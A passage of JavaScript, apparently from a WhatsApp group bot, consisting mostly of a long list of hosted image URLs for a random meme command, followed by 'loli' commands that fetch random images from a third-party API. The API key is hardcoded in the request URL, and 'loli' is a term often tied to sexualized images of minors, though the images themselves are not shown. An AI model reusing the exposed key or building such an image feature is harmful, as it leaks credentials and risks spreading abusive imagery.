'https://i.ibb.co/bX2Xnkh/IMG-20180703-WA0386.jpg',
'https://i.ibb.co/wNR5j9k/IMG-20180709-WA0336.jpg',
'https://i.ibb.co/88FPQFN/IMG-20180709-WA0364.jpg',
'https://i.ibb.co/yBsNbZ0/IMG-20180710-WA0066.jpg',
'https://i.ibb.co/vqZhnT0/IMG-20180710-WA0068.jpg',
'https://i.ibb.co/fxq6frQ/IMG-20180711-WA0207.jpg',
'https://i.ibb.co/FJB3tLz/IMG-20180711-WA0253.jpg',
'https://i.ibb.co/4JcBHDd/IMG-20180711-WA0455.jpg',
'https://i.ibb.co/G2BSmtd/IMG-20180711-WA0476.jpg',
'https://i.ibb.co/sjFMfMf/IMG-20180711-WA0632.jpg',
'https://i.ibb.co/ScNGWCR/IMG-20180711-WA0635.jpg',
'https://i.ibb.co/wRdWGsz/IMG-20180711-WA0638.jpg',
'https://i.ibb.co/m6C1Vms/IMG-20180713-WA0011.jpg',
'https://i.ibb.co/MSbm14C/IMG-20180716-WA0173.jpg',
'https://i.ibb.co/XCQ7YCN/IMG-20180716-WA0248.jpg',
'https://i.ibb.co/2yrNTL6/IMG-20180720-WA0855.jpg',
'https://i.ibb.co/Z2G5y5P/IMG-20180720-WA0931.jpg',
'https://i.ibb.co/HVPPrjN/IMG-20180720-WA0937.jpg',
'https://i.ibb.co/GkPZDfr/IMG-20180721-WA0194.jpg',
'https://i.ibb.co/Bj0XR9h/IMG-20180721-WA0196.jpg',
'https://i.ibb.co/FmNrqcy/IMG-20180721-WA0197.jpg',
'https://i.ibb.co/30GB6xD/IMG-20180721-WA0422.jpg',
'https://i.ibb.co/bvTZ1HB/IMG-20180721-WA0423.jpg',
'https://i.ibb.co/71NsWRL/IMG-20180722-WA0004.jpg',
'https://i.ibb.co/cD0x3s2/IMG-20180722-WA0136.jpg',
'https://i.ibb.co/Wg9r33L/IMG-20180722-WA0283.jpg',
'https://i.ibb.co/V3J7j2p/IMG-20180722-WA0362.jpg',
'https://i.ibb.co/Z8N38j9/IMG-20180725-WA0502.jpg',
'https://i.ibb.co/rxVNhDQ/IMG-20180725-WA0654.jpg',
'https://i.ibb.co/Qky7gvf/IMG-20180730-WA0130.jpg',
'https://i.ibb.co/X77rYC6/IMG-20180802-WA0322.jpg',
'https://i.ibb.co/jLmZ381/IMG-20180805-WA0175.jpg',
'https://i.ibb.co/9VBdymT/IMG-20180805-WA0180.jpg',
'https://i.ibb.co/qYfDKmJ/IMG-20180805-WA0196.jpg',
'https://i.ibb.co/vq6dkjv/IMG-20180805-WA0220.jpg',
'https://i.ibb.co/4RrHgP0/IMG-20180805-WA0224.jpg',
'https://i.ibb.co/y5RFbZm/IMG-20180806-WA0211.jpg',
'https://i.ibb.co/SwDggGN/IMG-20180807-WA0278.jpg',
'https://i.ibb.co/p4kzmTz/IMG-20180811-WA0516.jpg',
'https://i.ibb.co/YTx6h9V/IMG-20180812-WA0200.jpg',
'https://i.ibb.co/PFRp2FW/IMG-20180814-WA0107.jpg',
'https://i.ibb.co/y4WX6pq/IMG-20180814-WA0155.jpg',
'https://i.ibb.co/ypCGRcY/IMG-20180830-WA0432.jpg',
'https://i.ibb.co/6yQf5Qc/IMG-20180903-WA0170.jpg',
'https://i.ibb.co/1GZtcFp/IMG-20180904-WA0210.jpg',
'https://i.ibb.co/nQdmJRJ/IMG-20180907-WA0135.jpg',
'https://i.ibb.co/FbmnFXq/IMG-20180907-WA0291.jpg',
'https://i.ibb.co/5RH3xvq/IMG-20180908-WA0396.jpg',
'https://i.ibb.co/MZ0HPTk/IMG-20180910-WA0197.jpg',
'https://i.ibb.co/sqKtqSM/IMG-20180910-WA0269.jpg',
'https://i.ibb.co/2ZP8Lx6/IMG-20180914-WA0325.jpg',
'https://i.ibb.co/xFB8XTm/IMG-20180914-WA0369.jpg',
'https://i.ibb.co/Tm8Bdc0/IMG-20180915-WA0203.jpg',
'https://i.ibb.co/CH4K3W7/IMG-20180929-WA0103.jpg',
'https://i.ibb.co/277G3K3/IMG-20181018-WA0063.jpg',
'https://i.ibb.co/9WRBQRH/IMG-20181018-WA0065.jpg',
'https://i.ibb.co/SN0fxvq/IMG-20181018-WA0067.jpg',
'https://i.ibb.co/hg8Z03w/IMG-20181018-WA0583.jpg',
'https://i.ibb.co/ykwcYBc/IMG-20181018-WA0591.jpg',
'https://i.ibb.co/VgHRpDZ/IMG-20181023-WA0216.jpg',
'https://i.ibb.co/288xc2Y/IMG-20181023-WA0219.jpg',
'https://i.ibb.co/JnGnWV0/IMG-20181029-WA0036.jpg',
'https://i.ibb.co/bzSfbsd/IMG-20181029-WA0168.jpg',
'https://i.ibb.co/xChBM3w/IMG-20181102-WA0233.jpg',
'https://i.ibb.co/dbrZd2n/IMG-20181102-WA0238.jpg',
'https://i.ibb.co/pRNSpqB/IMG-20181102-WA0240.jpg',
'https://i.ibb.co/7k3mdbR/IMG-20181102-WA0470.jpg',
'https://i.ibb.co/PZ5szrX/IMG-20181102-WA0472.jpg',
'https://i.ibb.co/WB4KMRC/IMG-20181104-WA0225.jpg',
'https://i.ibb.co/xzcqpJR/IMG-20181104-WA0270.jpg',
'https://i.ibb.co/XCbY1kw/IMG-20181105-WA0177.jpg',
'https://i.ibb.co/Zdz4C20/IMG-20181105-WA0178.jpg',
'https://i.ibb.co/JndrMZF/IMG-20181105-WA0312.jpg',
'https://i.ibb.co/pXXXfmM/IMG-20181109-WA0036.jpg',
'https://i.ibb.co/9hW8wXd/IMG-20181109-WA0104.jpg',
'https://i.ibb.co/PFSbn9V/IMG-20181110-WA0010.jpg',
'https://i.ibb.co/vVq2Tfj/IMG-20181113-WA0166.jpg',
'https://i.ibb.co/QkzfdCc/IMG-20181113-WA0191.jpg',
'https://i.ibb.co/pXCS4fp/IMG-20181113-WA0257.jpg',
'https://i.ibb.co/QkN80Mf/IMG-20181122-WA0071.jpg',
'https://i.ibb.co/473XyrC/IMG-20181125-WA0088.jpg',
'https://i.ibb.co/DKQGKDX/IMG-20181125-WA0094.jpg',
'https://i.ibb.co/CP15yFV/IMG-20181213-WA0134.jpg',
'https://i.ibb.co/17PvfQK/IMG-20181213-WA0159.jpg',
'https://i.ibb.co/zQghTJM/IMG-20181213-WA0426.jpg',
'https://i.ibb.co/vsf5RFV/IMG-20181213-WA0432.jpg',
'https://i.ibb.co/Sf0BJQt/IMG-20181213-WA0661.jpg',
'https://i.ibb.co/jTDVYTy/IMG-20181214-WA0568.jpg',
'https://i.ibb.co/PZgFzZS/IMG-20181214-WA0644.jpg',
'https://i.ibb.co/Y2rYkBw/IMG-20181214-WA0650.jpg',
'https://i.ibb.co/1zjS2Hh/IMG-20181222-WA0551.jpg',
'https://i.ibb.co/1JXxJTP/IMG-20181222-WA0552.jpg',
'https://i.ibb.co/gM0R4jp/IMG-20181222-WA0690.jpg',
'https://i.ibb.co/GcyCM8Z/IMG-20181224-WA0344.jpg',
'https://i.ibb.co/dr2GXn4/IMG-20190216-WA0801.jpg',
'https://i.ibb.co/wrGP411/IMG-20190220-WA0351.jpg',
'https://i.ibb.co/rb5Xrd3/IMG-20190228-WA0238.jpg',
'https://i.ibb.co/3CDfCXY/IMG-20190318-WA0427.jpg',
'https://i.ibb.co/PQSfg8X/IMG-20190318-WA1010.jpg',
'https://i.ibb.co/0qWn49Z/IMG-20190324-WA0509.jpg',
'https://i.ibb.co/j4VS10n/IMG-20190325-WA0426.jpg',
'https://i.ibb.co/j5B38Hq/IMG-20190401-WA0731.jpg',
'https://i.ibb.co/s20YgTC/IMG-20190403-WA0080.jpg',
'https://i.ibb.co/fMYkN0N/IMG-20190408-WA0673.jpg',
'https://i.ibb.co/LQkG33G/IMG-20190516-WA1276.jpg',
'https://i.ibb.co/5sR58yT/IMG-20190517-WA0840.jpg',
'https://i.ibb.co/Z28QBZ6/IMG-20190517-WA1310.jpg',
'https://i.ibb.co/TYH3vgH/IMG-20190604-WA0204.jpg',
'https://i.ibb.co/b27N9S4/IMG-20190611-WA0065.jpg',
'https://i.ibb.co/qdvG4w6/IMG-20190614-WA0035.jpg',
'https://i.ibb.co/qN8HTnp/IMG-20190617-WA1013.jpg',
'https://i.ibb.co/b6BX1BR/IMG-20190619-WA0413.jpg',
'https://i.ibb.co/S6Y7TRd/IMG-20190619-WA0414.jpg',
'https://i.ibb.co/TgRHR80/IMG-20190619-WA0433.jpg',
'https://i.ibb.co/ZMyLYWv/IMG-20190619-WA0440.jpg',
'https://i.ibb.co/nqpPVTq/IMG-20190619-WA0443.jpg',
'https://i.ibb.co/jhgpvPT/IMG-20190620-WA0184.jpg',
'https://i.ibb.co/Z6T3xSv/IMG-20190620-WA0717.jpg',
'https://i.ibb.co/4Yt8tBW/IMG-20190620-WA0755.jpg',
'https://i.ibb.co/GTGRZgJ/IMG-20190620-WA0756.jpg',
'https://i.ibb.co/gVYynBq/IMG-20190620-WA0766.jpg',
'https://i.ibb.co/10bQtVh/IMG-20190620-WA0770.jpg',
'https://i.ibb.co/vsgg7py/IMG-20190620-WA0773.jpg',
'https://i.ibb.co/xJKrBn0/IMG-20190620-WA0777.jpg',
'https://i.ibb.co/vHKMF6N/IMG-20190620-WA0787.jpg',
'https://i.ibb.co/SK9W6KQ/IMG-20190620-WA0790.jpg',
'https://i.ibb.co/rp94Nsv/IMG-20190620-WA0797.jpg',
'https://i.ibb.co/mG448pC/IMG-20190620-WA0799.jpg',
'https://i.ibb.co/nrgg7qF/IMG-20190620-WA0801.jpg',
'https://i.ibb.co/Y2rxC8y/IMG-20190620-WA0805.jpg',
'https://i.ibb.co/xfRPw0f/IMG-20190620-WA0806.jpg',
'https://i.ibb.co/gvDRL1Q/IMG-20190704-WA0792.jpg',
'https://i.ibb.co/yhVshfk/IMG-20191021-WA0084.jpg',
'https://i.ibb.co/YyVp7jv/IMG-20191021-WA0092.jpg',
'https://i.ibb.co/RPg4qRp/IMG-20191021-WA0094.jpg',
'https://i.ibb.co/kMSknkY/IMG-20191021-WA0107.jpg',
'https://i.ibb.co/rb03WHy/IMG-20191022-WA0280.jpg',
'https://i.ibb.co/pJhMHdB/IMG-20191028-WA0316.jpg',
'https://i.ibb.co/BP60kMn/IMG-20191029-WA0299.jpg',
'https://i.ibb.co/KKnNzzz/IMG-20191101-WA0530.jpg',
'https://i.ibb.co/rQK1mFj/IMG-20191101-WA0531.jpg',
'https://i.ibb.co/hFN7K5G/IMG-20191103-WA0108.jpg',
'https://i.ibb.co/L6KhB1w/IMG-20191107-WA0410.jpg',
'https://i.ibb.co/8rZR3XV/IMG-20191109-WA0073-2.jpg',
'https://i.ibb.co/tstyFbY/IMG-20191116-WA0470.jpg',
'https://i.ibb.co/wWzT02B/IMG-20191117-WA0067-2.jpg',
'https://i.ibb.co/Kh4n6mN/IMG-20191117-WA0155-2.jpg',
'https://i.ibb.co/NSvMRjn/IMG-20191117-WA0241.jpg',
'https://i.ibb.co/qpwJ81Q/IMG-20191117-WA0247.jpg',
'https://i.ibb.co/gMkq5tk/IMG-20191118-WA0138.jpg',
'https://i.ibb.co/KLhGj5n/IMG-20191119-WA0224.jpg',
'https://i.ibb.co/KFv8Hf2/IMG-20191119-WA0550.jpg',
'https://i.ibb.co/n7Mg3B4/IMG-20191213-WA0031.jpg',
'https://i.ibb.co/qjw8QjL/IMG-20191223-WA1529.jpg',
'https://i.ibb.co/dBy9CX2/IMG-20191226-WA0423.jpg',
'https://i.ibb.co/TKQFcfz/IMG-20191231-WA0115.jpg',
'https://i.ibb.co/RzF22tZ/IMG-20200225-WA0442.jpg',
'https://i.ibb.co/GTYmLwB/IMG-20200225-WA0443.jpg',
'https://i.ibb.co/7GmLMBK/IMG-20200225-WA0447.jpg',
'https://i.ibb.co/KystZ4z/IMG-20200225-WA0448.jpg',
'https://i.ibb.co/7zQJh81/IMG-20200225-WA0451.jpg',
'https://i.ibb.co/Byrk168/IMG-20200225-WA0454.jpg',
'https://i.ibb.co/wy0L1g2/IMG-20200225-WA0457.jpg',
'https://i.ibb.co/k39n3t2/IMG-20200225-WA0458.jpg',
'https://i.ibb.co/m8h63MN/IMG-20200225-WA0461.jpg',
'https://i.ibb.co/zbbbk2z/IMG-20200225-WA0462.jpg',
'https://i.ibb.co/Z6JRKvj/IMG-20200225-WA0463.jpg',
'https://i.ibb.co/N3dVBVP/IMG-20200225-WA0469.jpg',
'https://i.ibb.co/qYZHb5d/IMG-20200225-WA0470.jpg',
'https://i.ibb.co/ySXxhpx/IMG-20200225-WA0472.jpg',
'https://i.ibb.co/1LVPR7q/IMG-20200225-WA0473.jpg',
'https://i.ibb.co/V9P05vv/IMG-20200225-WA0481.jpg',
'https://i.ibb.co/55DSqpJ/IMG-20200225-WA0486.jpg',
'https://i.ibb.co/d5dk2vR/IMG-20200225-WA0489.jpg',
'https://i.ibb.co/ZGYBTrG/IMG-20200225-WA0491.jpg',
'https://i.ibb.co/3NhYxFT/IMG-20200225-WA0503.jpg',
'https://i.ibb.co/9TM5M3f/IMG-20200225-WA0504.jpg',
'https://i.ibb.co/C2x9r9r/IMG-20200225-WA0505.jpg',
'https://i.ibb.co/F5MgjKD/IMG-20200225-WA0509.jpg',
'https://i.ibb.co/fN1Hrzk/IMG-20200225-WA0510.jpg',
'https://i.ibb.co/Y0yRNzG/IMG-20200225-WA0516.jpg',
'https://i.ibb.co/thsb6TY/IMG-20200225-WA0517.jpg',
'https://i.ibb.co/R2SF36J/IMG-20200225-WA0522.jpg',
'https://i.ibb.co/hgGb8D5/IMG-20200225-WA0524.jpg',
'https://i.ibb.co/3z86vzR/IMG-20200225-WA0535.jpg',
'https://i.ibb.co/rbLzKQ0/IMG-20200225-WA0536.jpg',
'https://i.ibb.co/ngF5Qfp/IMG-20200225-WA0541.jpg',
'https://i.ibb.co/wz7tTj9/IMG-20200225-WA0673.jpg',
'https://i.ibb.co/GTBFB3r/IMG-20200225-WA0936.jpg',
'https://i.ibb.co/s28h9P9/IMG-20200229-WA0415.jpg',
'https://i.ibb.co/ZXmZHKW/IMG-20200229-WA0425.jpg',
'https://i.ibb.co/T4MT6V2/IMG-20200301-WA0591.jpg',
'https://i.ibb.co/9bvGSyQ/IMG-20200302-WA0536.jpg',
'https://i.ibb.co/N1Q04Q3/IMG-20200302-WA0537.jpg',
'https://i.ibb.co/mvnLdqZ/IMG-20200302-WA0541.jpg',
'https://i.ibb.co/QNL94R2/IMG-20200302-WA0543.jpg',
'https://i.ibb.co/vQGh3G5/IMG-20200302-WA0553.jpg',
'https://i.ibb.co/xGCM8jT/IMG-20200302-WA0606.jpg',
'https://i.ibb.co/r0y7HNs/IMG-20200302-WA0607.jpg',
'https://i.ibb.co/ysy7CHR/IMG-20200304-WA0094.jpg',
'https://i.ibb.co/kSzz3sp/IMG-20200305-WA0246.jpg',
'https://i.ibb.co/Jmpyswq/IMG-20200305-WA0288.jpg',
'https://i.ibb.co/N60z4Qj/IMG-20200305-WA0369.jpg',
'https://i.ibb.co/Wxh9yrn/IMG-20200305-WA0544.jpg',
'https://i.ibb.co/W0T29VW/IMG-20200305-WA0931.jpg',
'https://i.ibb.co/7bSrBfN/IMG-20200306-WA0257.jpg',
'https://i.ibb.co/DQSdWjT/IMG-20200601-WA0622.jpg',
'https://i.ibb.co/51GmtJW/IMG-20200601-WA3333.jpg',
'https://i.ibb.co/PGFvZGw/IMG-20200602-WA2139.jpg',
'https://i.ibb.co/zFqk2Yr/IMG-20200603-WA1739.jpg',
'https://i.ibb.co/LYLsZ3W/IMG-20200603-WA1750.jpg',
'https://i.ibb.co/WHJ11Tn/IMG-20200604-WA1582.jpg',
'https://i.ibb.co/Qktfw4q/IMG-20200912-WA0438.jpg',
'https://i.ibb.co/Vv8TLdc/IMG-20200919-WA0148.jpg',
'https://i.ibb.co/svr6JfP/IMG-20200920-WA0421.jpg',
'https://i.ibb.co/3fq05tr/IMG-20200922-WA0710.jpg',
'https://i.ibb.co/bB9zqB7/IMG-20200924-WA0373.jpg',
'https://i.ibb.co/RT8JLWc/IMG-20200926-WA0375.jpg',
'https://i.ibb.co/jb6B8S5/IMG-20200926-WA0441.jpg',
'https://i.ibb.co/zfvYB1b/IMG-20200926-WA0489.jpg',
'https://i.ibb.co/wrmncQM/IMG-20200926-WA0496.jpg',
'https://i.ibb.co/DKQNmBM/IMG-20200929-WA0133.jpg',
'https://i.ibb.co/y4fKnML/IMG-20200929-WA0190.jpg',
'https://i.ibb.co/6BNvqJg/IMG-20200930-WA0395.jpg',
'https://i.ibb.co/nBRpNWn/IMG-20200930-WA0398.jpg',
'https://i.ibb.co/9gQGF7C/IMG-20201001-WA0038.jpg',
'https://i.ibb.co/gyjQkDR/IMG-20201001-WA0385.jpg',
'https://i.ibb.co/ZYMMmXb/IMG-20201001-WA0403.jpg',
'https://i.ibb.co/w6HdYfD/IMG-20201001-WA0419.jpg',
'https://i.ibb.co/RNqs2nQ/IMG-20201002-WA0636.jpg',
'https://i.ibb.co/S5X2Thz/IMG-20201125-WA0038.jpg',
'https://i.ibb.co/GRLtPsd/IMG-20201125-WA0686.jpg',
'https://i.ibb.co/ccRJ18B/IMG-20201125-WA1231.jpg',
'https://i.ibb.co/376d60w/IMG-20210113-WA1063.jpg',
'https://i.ibb.co/sVngJ5p/IMG-20210113-WA1266.jpg',
'https://i.ibb.co/dkj4RcH/IMG-20210119-WA0234.jpg',
'https://i.ibb.co/sFSgfXV/IMG-20210119-WA0296.jpg',
'https://i.ibb.co/ys8v6GF/IMG-20210119-WA1026.jpg',
'https://i.ibb.co/rfsQRM7/IMG-20210120-WA0291.jpg',
'https://i.ibb.co/wW6wFBH/IMG-20210123-WA0172.jpg',
'https://i.ibb.co/1R0jsff/IMG-20210123-WA0271.jpg',
'https://i.ibb.co/4RF0y8Y/IMG-20210123-WA0448.jpg',
'https://i.ibb.co/DbmD7PP/IMG-20210124-WA0183.jpg',
'https://i.ibb.co/z53Kmz2/IMG-20210125-WA0030.jpg',
'https://i.ibb.co/0q8XCL9/IMG-20210202-WA0045.jpg',
'https://i.ibb.co/s6HKSK1/IMG-20210205-WA0311.jpg',
'https://i.ibb.co/hWL1HB1/IMG-20210205-WA0353.jpg',
'https://i.ibb.co/bB6SNv3/IMG-20210211-WA0614.jpg',
'https://i.ibb.co/JrYB3d7/IMG-20210215-WA0907.jpg',
'https://i.ibb.co/1Mg2wFR/IMG-20210216-WA0000.jpg',
'https://i.ibb.co/C8Bx35K/IMG-20210216-WA0589.jpg',
'https://i.ibb.co/LYVg6f4/IMG-20210216-WA0590.jpg',
'https://i.ibb.co/NZJrjW3/IMG-20210216-WA0598.jpg',
'https://i.ibb.co/ZKhzD6k/IMG-20210218-WA0597.jpg',
'https://i.ibb.co/yB5kBt3/IMG-20210219-WA0916.jpg',
'https://i.ibb.co/tZML9xv/IMG-20210221-WA0530.jpg',
'https://i.ibb.co/W5bJnxg/IMG-20210224-WA0437.jpg',
'https://i.ibb.co/ykq6f8m/IMG-20210226-WA0372.jpg',
'https://i.ibb.co/1Rd4Mr4/IMG-20210226-WA0374.jpg',
'https://i.ibb.co/2St9mRx/IMG-20210226-WA0388.jpg',
'https://i.ibb.co/wzmdnGp/IMG-20210401-WA0017.jpg',
'https://i.ibb.co/Xtb5fgJ/IMG-20211017-WA0106.jpg',
'https://i.ibb.co/6rCWFJz/maxresdefault.jpg',
'https://i.ibb.co/3rQySYR/Mi-momento-ha-llegado-plantilla-2.jpg',
'https://i.ibb.co/mXtRCBj/Pics-Art-02-15-11-20-14.jpg',
'https://i.ibb.co/JnvHLBf/Pics-Art-03-05-01-22-19.jpg',
'https://i.ibb.co/dMWy6yh/Pics-Art-03-24-11-23-42.jpg',
'https://i.ibb.co/Hqs3D1n/Pics-Art-04-30-03-42-18.jpg',
'https://i.ibb.co/pfWrHVx/Pics-Art-08-20-01-35-39.jpg',
'https://i.ibb.co/3TWCRPP/Pics-Art-11-02-08-42-06.jpg',
'https://i.ibb.co/kBGjX6z/Ranqued-Paladins.jpg',
'https://i.ibb.co/MsV0h8g/received-600414263678793.jpg',
'https://i.ibb.co/TbccY1H/Screenshot-2019-06-19-00-34-50.png',
'https://i.ibb.co/N3fThsB/Screenshot-2019-06-21-16-12-02.png',
'https://i.ibb.co/b3ww3HK/Screenshot-2019-06-29-13-16-13.png',
'https://i.ibb.co/t2VD9Gh/Screenshot-2019-07-16-23-28-56.png',
'https://i.ibb.co/tsrX7Jy/Screenshot-2021-06-16-09-03-33-785-com-miui-gallery.jpg',
'https://i.ibb.co/Fz6mCJ9/Screenshot-2021-06-17-17-25-58-083-com-google-android-youtube.jpg',
'https://i.ibb.co/6nHDZ4x/Screenshot-2021-06-17-22-22-21-244-com-google-android-youtube.jpg',
'https://i.ibb.co/BcFnYq1/Screenshot-20180323-114411.png',
'https://i.ibb.co/vQq93sk/Screenshot-20200504-210017.png',
'https://i.ibb.co/rGQdMyz/Screenshot-20200511-103620.png',
'https://i.ibb.co/BTwTC7S/Screenshot-20200611-234552.png',
'https://i.ibb.co/pf21cm4/Screenshot-20200719-233802-Whats-App.jpg',
'https://i.ibb.co/Bz5LvX8/Screenshot-20200901-184729-Whats-App.jpg',
'https://i.ibb.co/YDnMrzh/Screenshot-20201101-003749.jpg',
'https://i.ibb.co/VMM750T/Screenshot-20201108-125520-com-whatsapp.jpg',
'https://i.ibb.co/wzQDCPC/Screenshot-20201115-154843.jpg',
'https://i.ibb.co/sy75cKF/Screenshot-20201125-015049.jpg',
'https://i.ibb.co/0QD525k/Screenshot-20201127-234328.jpg',
'https://i.ibb.co/nkrg4Q5/Screenshot-20201201-001701.jpg',
'https://i.ibb.co/fnKpSDT/Screenshot-20201206-124423.jpg',
'https://i.ibb.co/w0QXdDF/Screenshot-20201213-210031-com-whatsapp.jpg',
'https://i.ibb.co/YLgsYDK/Screenshot-20201222-230502.jpg',
'https://i.ibb.co/tJ8TbNP/Screenshot-20201226-074915.jpg',
'https://i.ibb.co/7b6PbJ3/Screenshot-20201226-075415.jpg',
'https://i.ibb.co/v1nHPwH/Screenshot-20201226-080426.jpg',
'https://i.ibb.co/cYMMtZV/Screenshot-20201226-080502.jpg',
'https://i.ibb.co/qp3bW1m/Screenshot-20201231-010444.jpg',
'https://i.ibb.co/ssMkJrv/Screenshot-20201231-191044-com-whatsapp.jpg',
'https://i.ibb.co/0CZYc70/Screenshot-20210102-002159.jpg',
'https://i.ibb.co/mh44Pdv/Screenshot-20210117-002220.jpg',
'https://i.ibb.co/gtcy3P3/Screenshot-20210117-002315.jpg',
'https://i.ibb.co/NnTXd2W/Screenshot-20210117-002334.jpg',
'https://i.ibb.co/hHQRy6z/Screenshot-20210117-002522.jpg',
'https://i.ibb.co/bXwhcdW/Screenshot-20210117-002615.jpg',
'https://i.ibb.co/tsrWz9j/Screenshot-20210117-002749.jpg',
'https://i.ibb.co/HYxy3Hm/Screenshot-20210117-002830.jpg',
'https://i.ibb.co/DL8Xbtr/Screenshot-20210118-010837.jpg',
'https://i.ibb.co/QnGX5G1/Screenshot-20210118-010901.jpg',
'https://i.ibb.co/82jBkfN/Screenshot-20210119-183931.jpg',
'https://i.ibb.co/7pKC1zw/Screenshot-20210124-193002-com-google-android-youtube-2.jpg',
'https://i.ibb.co/zVJBG4C/Screenshot-20210125-144659-com-google-android-youtube-2.jpg',
'https://i.ibb.co/G9tWK12/Screenshot-20210207-134822-com-whatsapp.jpg',
'https://i.ibb.co/W2YmswS/Screenshot-20210216-001956.jpg',
'https://i.ibb.co/yhRDBDS/Screenshot-20210216-002024.jpg',
'https://i.ibb.co/mhSYw58/Screenshot-20210216-002055.jpg',
'https://i.ibb.co/bv4L2Lk/Screenshot-20210217-000023.jpg',
'https://i.ibb.co/TgNwRRY/Screenshot-20210217-001342.jpg',
'https://i.ibb.co/553R8Sv/Screenshot-20210220-002050.jpg',
'https://i.ibb.co/yfjMr8x/Screenshot-20210220-002138.jpg',
'https://i.ibb.co/zXGMt3w/Screenshot-20210221-154939.jpg',
'https://i.ibb.co/xMPBbkw/Screenshot-20210225-091101.jpg',
'https://i.ibb.co/vQWjbQS/Screenshot-20210225-091153.jpg',
'https://i.ibb.co/ZKPzghM/Screenshot-20210302-235054.jpg',
'https://i.ibb.co/YXrCp7Z/Screenshot-20210302-235211.jpg',
'https://i.ibb.co/PcSLj1J/Screenshot-20210302-235613.jpg',
'https://i.ibb.co/fDBcdrn/Screenshot-20210302-235648.jpg',
'https://i.ibb.co/F57gNSY/Screenshot-20210302-235903.jpg',
'https://i.ibb.co/YXqT4Y9/Screenshot-20210303-000005.jpg',
'https://i.ibb.co/VtM2gvX/Screenshot-20210304-235556.jpg',
'https://i.ibb.co/t2zp32X/Screenshot-20210304-235810.jpg',
'https://i.ibb.co/6XgXgWV/Screenshot-20210308-232052.jpg',
'https://i.ibb.co/yBHB446/Screenshot-20210308-232143.jpg',
'https://i.ibb.co/fMGwV30/Screenshot-20210308-232227.jpg',
'https://i.ibb.co/6mj7P7x/Screenshot-20210309-234357.jpg',
'https://i.ibb.co/HVFrRgF/Screenshot-20210309-234956.jpg',
'https://i.ibb.co/dGVFVqv/Screenshot-20210311-015948.jpg',
'https://i.ibb.co/PYTCsQG/Screenshot-20210311-122812.jpg',
'https://i.ibb.co/648KBpS/Screenshot-20210315-003740.jpg',
'https://i.ibb.co/2hBkDpR/Screenshot-20210315-003812.jpg',
'https://i.ibb.co/R3SKNRG/Screenshot-20210315-004913.jpg',
'https://i.ibb.co/8mP7Gfp/Screenshot-20210315-005541.jpg',
'https://i.ibb.co/5v46k7D/Screenshot-20210317-003641.jpg',
'https://i.ibb.co/yfcYJKs/Screenshot-20210317-003710.jpg',
'https://i.ibb.co/jJbcxHB/Screenshot-20210321-234414.jpg',
'https://i.ibb.co/ydqKMvm/Screenshot-20210321-234513.jpg',
'https://i.ibb.co/6Ybc60T/Screenshot-20210322-231454.jpg',
'https://i.ibb.co/MNr5RHH/Screenshot-20210324-001723.jpg',
'https://i.ibb.co/dDYVCsX/Screenshot-20210324-001820.jpg',
'https://i.ibb.co/68srd2Q/Screenshot-20210326-000852.jpg',
'https://i.ibb.co/Y8smPqq/Screenshot-20210327-004248.jpg',
'https://i.ibb.co/gzvhR23/Screenshot-20210328-234415.jpg',
'https://i.ibb.co/SJDggQr/Screenshot-20210328-234504.jpg',
'https://i.ibb.co/HHVDX9Z/Screenshot-20210329-231843.jpg',
'https://i.ibb.co/v4CFfTW/Screenshot-20210331-174009.jpg',
'https://i.ibb.co/Hdkc3Tv/Screenshot-20210404-003442.jpg',
'https://i.ibb.co/qywsNb0/Screenshot-20210404-003636.jpg',
'https://i.ibb.co/NWv9rjN/Screenshot-20210405-234124.jpg',
'https://i.ibb.co/SVxNjGJ/Screenshot-20210406-141254.jpg',
'https://i.ibb.co/KsbdgJS/Screenshot-20210408-232218.jpg',
'https://i.ibb.co/k50VQb7/Screenshot-20210409-233508.jpg',
'https://i.ibb.co/8j1nSWk/Screenshot-20210409-233535.jpg',
'https://i.ibb.co/PDD6FQc/Screenshot-20210414-000243.jpg',
'https://i.ibb.co/tD3Mtb5/Screenshot-20210415-234556.jpg',
'https://i.ibb.co/SmDCFnN/Screenshot-20210415-234646.jpg',
'https://i.ibb.co/z4T7qsM/Screenshot-20210415-234711.jpg',
'https://i.ibb.co/87ZJ5Bp/Screenshot-20210417-121748.jpg',
'https://i.ibb.co/fCXvBPD/Screenshot-20210420-000352.jpg',
'https://i.ibb.co/Z6kfMVP/Screenshot-20210427-104254.jpg',
'https://i.ibb.co/HHSFjDK/Screenshot-20210427-104315.jpg',
'https://i.ibb.co/2NNY3dS/Screenshot-20210506-163046.jpg',
'https://i.ibb.co/GPGrDPR/Screenshot-20210506-163140.jpg',
'https://i.ibb.co/LZbT0wJ/Screenshot-20210506-163351.jpg',
'https://i.ibb.co/q05QyQc/Screenshot-20210509-130955.jpg',
'https://i.ibb.co/dfKft1z/Screenshot-20210510-125257.jpg',
'https://i.ibb.co/ZW521Jd/Screenshot-20210520-164036.jpg',
'https://i.ibb.co/xXs3xP6/Screenshot-20210520-222454.jpg',
'https://i.ibb.co/WW3rdQS/Screenshot-20210528-235342.jpg',
'https://i.ibb.co/ygHrBRn/Screenshot-20210528-235754.jpg',
'https://i.ibb.co/YbFthxM/Screenshot-20210605-145722.jpg',
'https://i.ibb.co/qrRP4Cs/Screenshot-20210927-150505493.jpg',
'https://i.ibb.co/vXN8c5Y/Screenshot-20210930-105553954.jpg',
'https://i.ibb.co/kBy52rp/Screenshot-20211022-150829329.jpg']
let mems = memess[Math.floor(Math.random() * memess.length)]
      memes = await getBuffer(mems)
cnf.sendMessage(from, memes, image, {quote: mek})
addFilter(from)
          break




case prefix+'loli':
      if (isBanned) return  reply(mess.banned)            
      if (!isRegistered) return reply(ind.noregis())	
      if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
	  anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/randomloli?apikey=Ikyy69`)
      buffer = await getBuffer(anu.link)
	  cnf.sendMessage(from, buffer, image, {quoted: mek, caption: 'Aquí tienes 💕🦈'})
	  addFilter(from)
          break

case prefix+'loli2':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
